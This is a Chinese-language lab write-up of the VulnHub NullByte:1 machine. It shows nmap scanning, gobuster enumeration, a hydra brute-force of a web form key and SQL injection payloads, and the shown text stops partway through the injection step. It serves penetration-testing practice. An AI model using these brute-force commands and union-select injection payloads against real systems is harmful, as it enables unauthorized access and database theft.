# NullByte:1 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/nullbyte-1,126/
-   下载地址：https://download.vulnhub.com/nullbyte/NullByte.ova.zip



## 信息收集：

### 主机发现：

```shell
❯ sudo nmap -sn 192.168.2.1/24                                    
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 20:58 HKT
Nmap scan report for 192.168.2.1
Host is up (0.0030s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.0022s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.147
Host is up (0.00092s latency).
MAC Address: 00:0C:29:5D:65:77 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00019s latency).
MAC Address: 00:50:56:E6:75:62 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.03 seconds
```



### 端口扫描

```shell
# TCP扫描
❯ sudo nmap --min-rate 10000 -sT -p- 192.168.2.147 -oA Nmap-scan/Ports      
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:00 HKT
Nmap scan report for 192.168.2.147
Host is up (0.0015s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
48107/tcp open  unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds

# UDP扫描
❯ sudo nmap --min-rate 10000 -sU -p- 192.168.2.147 -oA Nmap-scan/Ports-sU 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:00 HKT
Warning: 192.168.2.147 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.147
Host is up (0.00074s latency).
Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
111/udp   open  rpcbind
5353/udp  open  zeroconf
40979/udp open  unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 73.12 seconds
```



### 服务及系统版本探测

```shell
❯ sudo nmap -sC -sV -O -p80,111,777,5353,40979,48107 192.168.2.147 -oA Nmap-scan/sC
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:04 HKT
Nmap scan report for 192.168.2.147
Host is up (0.00072s latency).

PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40979/udp   status
|   100024  1          45934/udp6  status
|   100024  1          48107/tcp   status
|_  100024  1          58354/tcp6  status
777/tcp   open   ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
5353/tcp  closed mdns
40979/tcp closed unknown
48107/tcp open   status  1 (RPC #100024)
MAC Address: 00:0C:29:5D:65:77 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds

```



### 基础漏洞扫描

```shell
❯ sudo nmap --script=vuln -p80,111,777,5353,40979,48107 192.168.2.147 -oA Nmap-scan/Script
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:21 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.147
Host is up (0.00048s latency).

PORT      STATE  SERVICE
80/tcp    open   http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting folder
111/tcp   open   rpcbind
777/tcp   open   multiling-http
5353/tcp  closed mdns
40979/tcp closed unknown
48107/tcp open   unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.94 seconds
```



## web 发现

-   默认页
-   ![image-20230608210805376](https://raw.githubusercontent.com/r0o983/images/main/image-20230608210805376.png)

### 使用`gobuster`进行初步扫描

```shell
❯ sudo gobuster dir -u http://192.168.2.147 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.147
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/08 21:06:46 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://192.168.2.147/uploads/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.147/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.2.147/phpmyadmin/]
/server-status        (Status: 403) [Size: 301]
Progress: 218851 / 220561 (99.22%)
===============================================================
2023/06/08 21:07:34 Finished
===============================================================
```

-   经过多次扫描仍然没有获得任何有效信息。



### 使用exiftool查看图片信息

```shell
❯ exiftool main.gif 
ExifTool Version Number         : 12.57
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2015:08:02 00:39:30+08:00
File Access Date/Time           : 2023:06:08 21:11:44+08:00
File Inode Change Date/Time     : 2023:06:08 21:11:38+08:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

-   将`Comment`给出的提示信息放入url进行测试，发现存在一个新页面
-   ![image-20230609093326204](https://raw.githubusercontent.com/r0o983/images/main/image-20230609093326204.png)
-   查看源代码提示密码并不复杂，使用爆破工具进行爆破
-   ![image-20230609093659317](https://raw.githubusercontent.com/r0o983/images/main/image-20230609093659317.png)



### 使用hydra进行爆破

```shell
❯ hydra 192.168.2.147 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l test -P /usr/share/wordlists/rockyou.txt
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-09 09:44:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.2.147:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key
[STATUS] 4452.00 tries/min, 4452 tries in 00:01h, 14339947 to do in 53:42h, 16 active
[STATUS] 4538.67 tries/min, 13616 tries in 00:03h, 14330783 to do in 52:38h, 16 active
[80][http-post-form] host: 192.168.2.147   login: test   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:31

参数释义：
	^PASS^ 爆破的密码位置
	http-form-post	表单提交方式
	invalid key 是一个表示认证失败的响应字符串，用于判断密码是否正确
```

-   成功获得密码：`elite`，输入密码进入以下页面
-   ![image-20230609095747298](https://raw.githubusercontent.com/r0o983/images/main/image-20230609095747298.png)
-   经过测试，输入任意不存在的字符会提示`Fetched data successfully` ，输入当前字符的任意字符都会查出数据，应该是使用的模糊查询
-   ![image-20230609100049931](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100049931.png)



### sql注入

-   输入双引号会触发sql语句报错
-   ![image-20230609100151364](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100151364.png)
-   构建sql语句，查看当前有几列数据`" order by 4 -- `查询到第四列数据时进行报错
-   ![image-20230609100412683](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100412683.png)
-   查看回显点`" union select 1,2,3 -- `
-   ![image-20230609100519574](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100519574.png)
-   查看当前的库信息，版本信息，用户信息`" union select version(),database(),user() -- `
-   ![image-20230609100723443](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100723443.png)
-   



